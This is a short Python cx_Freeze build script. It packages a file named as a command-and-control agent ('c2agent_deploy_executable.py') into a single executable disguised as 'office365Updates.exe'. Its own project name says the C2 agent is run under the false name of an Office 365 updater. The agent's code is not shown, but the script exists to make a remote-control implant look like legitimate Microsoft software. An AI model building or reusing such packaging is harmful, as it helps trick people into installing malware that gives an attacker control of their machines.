"""run > python .\setup.py build to build the executable
"""
from cx_Freeze import setup, Executable

setup(
    name="c2 agent executor as sudo name office365Updates",
    version="0.1",
    build_exe_options={"build_exe": "build", "create_shared_zip": False, "compressed": True,
                       "include_in_shared_zip": False, "optimize": 2, "excludes": ["tkinter"],
                       "onefile": True, "copy_dependent_files": True, "include_msvcr": True},
    executables=[Executable("c2agent_deploy_executable.py", targetName="office365Updates.exe")]
)
